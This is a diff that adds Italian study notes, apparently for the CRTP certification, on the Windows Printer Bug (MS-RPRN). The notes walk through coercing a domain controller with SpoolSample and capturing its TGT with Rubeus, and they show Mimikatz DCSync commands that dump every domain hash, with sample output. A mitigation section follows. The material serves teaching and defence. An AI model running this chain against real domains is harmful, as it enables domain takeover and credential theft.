@@ -48,6 +48,14 @@
   - [Come lo usi in pratica](#come-lo-usi-in-pratica)
   - [Relazione con Kerberos](#relazione-con-kerberos)
 - [lsass](#lsass)
+- [PrinterBug](#printerbug)
+  - [Il meccanismo](#il-meccanismo)
+  - [Perché è utile](#perché-è-utile)
+  - [Le condizioni necessarie](#le-condizioni-necessarie)
+  - [L'attacco completo step by step](#lattacco-completo-step-by-step)
+  - [Perché SMB signing è rilevante](#perché-smb-signing-è-rilevante)
+  - [Difesa](#difesa)
+  - [Quindi SMB signing perché lo menzioniamo](#quindi-smb-signing-perché-lo-menzioniamo)
 
 
 # AD Basi
@@ -413,3 +421,114 @@ Kerberos e LDAP sono due cose separate che lavorano insieme in AD. **Kerberos** 
 # lsass
 - lsass.exe (Local Security Authority Subsystem Service) è il processo Windows responsabile di gestire tutte le autenticazioni. Ogni volta che un utente si autentica su quella macchina, lsass riceve le credenziali, le verifica, e poi le tiene in memoria per tutta la durata della sessione — inclusi TGT e chiavi di sessione.
 - Quindi lsass è fondamentalmente un deposito di credenziali attive in memoria.
+
+
+# PrinterBug
+Il Printer Bug (ufficialmente MS-RPRN) è una "feature" del protocollo Windows Print System Remote Protocol che permette a qualsiasi utente di dominio di forzare un computer a autenticarsi verso un host arbitrario.
+
+## Il meccanismo
+- Il Print Spooler è un servizio Windows che gestisce le code di stampa. Espone un'API RPC chiamata ```RpcRemoteFindFirstPrinterChangeNotification``` che permette a un client di dire a un server "avvisami quando ci sono cambiamenti sulla tua coda di stampa". Il problema è che quando il server invia questa notifica, si autentica verso il client — e lo fa usando l'account computer della macchina (```DC$``` se è il DC).
+- Non è una vulnerabilità nel senso classico — il protocollo funziona esattamente come progettato. Microsoft lo chiama feature perché è comportamento intenzionale, anche se ovviamente è un problema di sicurezza enorme.
+
+## Perché è utile
+Il caso d'uso principale è combinarlo con unconstrained delegation. Hai già una macchina con unconstrained delegation e aspetti che qualcuno di privilegiato si autentichi — ma potresti aspettare ore. Il Printer Bug ti permette di forzare il DC a autenticarsi alla tua macchina immediatamente, rubarne il TGT, e fare DCSync.
+```
+tu (su macchina con unconstrained delegation)
+        ↓
+forzi DC$ ad autenticarsi alla tua macchina con Printer Bug
+        ↓
+Rubeus cattura il TGT di DC$ in memoria
+        ↓
+inietti il TGT → DCSync → tutti gli hash del dominio
+```
+
+## Le condizioni necessarie
+- Credenziali AD valide — qualsiasi utente di dominio, anche il più basico. Non servono privilegi particolari per chiamare l'API RPC.
+- Connettività SMB verso il target — porta 445 aperta verso la macchina che vuoi forzare (tipicamente il DC).
+- Print Spooler in esecuzione sul target — il servizio deve girare. Sui DC è spesso attivo di default anche se non necessario.
+
+```
+# Verifica se Print Spooler gira sul DC
+GWMI Win32_Printer -Computer dc01.corp.local
+# Se restituisce risultati → il servizio è attivo
+
+# Alternativa
+Get-PrinterPort -ComputerName dc01.corp.local
+```
+
+- SMB signing non enforced — SMB signing verifica l'integrità dei pacchetti SMB. Se è enforced, un attaccante non può modificare o relay il traffico SMB. Se non è enforced, il traffico è più manipolabile.
+```
+# Verifica SMB signing con nmap
+nmap --script=smb2-security-mode -p445 192.168.1.10
+
+# Output se signing NON enforced:
+# smb2-security-mode: Message signing enabled but not required ← vulnerabile
+
+# Output se signing enforced:
+# smb2-security-mode: Message signing enabled and required ← non vulnerabile
+```
+
+## L'attacco completo step by step
+Step 1 — su una macchina con unconstrained delegation avvii Rubeus in modalità monitor per catturare TGT in arrivo:
+```
+# Su PRINT-SRV (macchina con unconstrained delegation)
+Rubeus.exe monitor /interval:1 /filteruser:dc01$
+```
+
+Step 2 — da qualsiasi macchina del dominio (basta avere credenziali valide) usi SpoolSample per forzare il DC ad autenticarsi a PRINT-SRV:
+```
+# Forza dc01 ad autenticarsi a PRINT-SRV
+SpoolSample.exe dc01.corp.local PRINT-SRV.corp.local
+```
+Step 3 — Rubeus su PRINT-SRV vede arrivare il TGT di dc01$:
+```
+[+] 14/01/2024 10:23:45 UTC - Found new TGT:
+  User            : dc01$@CORP.LOCAL
+  StartTime       : 14/01/2024 10:23:45
+  EndTime         : 14/01/2024 20:23:45
+  Base64EncodedTicket: doIFHDCCBRig...
+```
+Step 4 — inietti il TGT e fai DCSync:
+```
+# Inietti il TGT di dc01$
+Rubeus.exe ptt /ticket:doIFHDCCBRig...
+
+# DCSync — dumpa tutti gli hash
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /all /csv"'
+
+# Output:
+# krbtgt  : aes256:abc123...  ntlm:def456...
+# Administrator : aes256:...  ntlm:...
+# (tutti gli utenti del dominio)
+```
+
+## Perché SMB signing è rilevante
+- SMB signing non blocca il Printer Bug direttamente — il problema è che senza signing il traffico di autenticazione NTLM che arriva può essere relayato verso altri target. Con SMB signing enforced puoi ancora catturare il TGT (se hai unconstrained delegation) ma non puoi fare NTLM relay con quella autenticazione.
+- In pratica per l'attacco con unconstrained delegation + Printer Bug, SMB signing non è strettamente necessario che sia disabilitato — ti basta catturare il TGT. SMB signing diventa critico se invece vuoi fare NTLM relay con quella autenticazione forzata.
+
+## Difesa
+```
+# Disabilita Print Spooler sui DC (non ne hanno bisogno)
+Stop-Service -Name Spooler -Force
+Set-Service -Name Spooler -StartupType Disabled
+
+# Abilita SMB signing su tutti i sistemi via GPO
+# Computer Configuration → Windows Settings → Security Settings
+# → Local Policies → Security Options
+# → Microsoft network server: Digitally sign communications (always) → Enabled
+```
+Disabilitare Print Spooler sui DC è la mitigazione principale — Microsoft stessa lo raccomanda. I DC non hanno bisogno di stampare nulla.
+
+## Quindi SMB signing perché lo menzioniamo
+Nel contesto del Printer Bug, SMB signing è rilevante solo se invece di catturare il TGT vuoi fare NTLM relay con l'autenticazione forzata — uno scenario diverso da quello con unconstrained delegation.
+```
+Scenario 1 — unconstrained delegation + Printer Bug:
+forzi DC$ ad autenticarsi → catturi TGT → DCSync
+SMB signing non importa per questo
+
+Scenario 2 — NTLM relay + Printer Bug:
+forzi DC$ ad autenticarsi → relay dell'autenticazione NTLM verso altro target
+SMB signing IMPORTA — se enforced blocca il relay
+```
+
+> Nella CRTP il percorso più comune è il primo — unconstrained delegation + Printer Bug + DCSync — che non ha nulla a che fare con NTLM relay.
